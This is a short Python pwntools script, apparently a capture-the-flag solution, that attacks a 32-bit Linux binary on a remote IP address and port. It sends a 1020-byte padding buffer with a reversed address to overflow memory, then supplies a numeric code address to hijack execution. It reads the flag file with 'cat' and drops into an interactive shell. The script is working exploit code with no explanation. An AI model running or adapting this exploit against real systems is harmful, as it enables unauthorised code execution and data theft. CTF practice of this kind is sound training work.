from pwn import *

context(arch='i386', os='linux')

#p = process('./your_name', stdout=PIPE)
p= remote("13.233.178.121","6789")
p.recvuntil("Enter a string again for no reason")


p.send("A"*1020+"\x08\x04\xc0\x30"[::-1])


p.recvuntil("Enter a string")


p.send("\nAAAA\n")





#p.recvuntil("Enter a string")


#p.send("\nAAAA\n")


p.recvuntil("Enter a number")
p.sendline("134517202")

p.sendline("cat /home/your_name/flag.txt")


#p.send("134517202")
#p.send(p32(0x080491d2))



p.interactive()
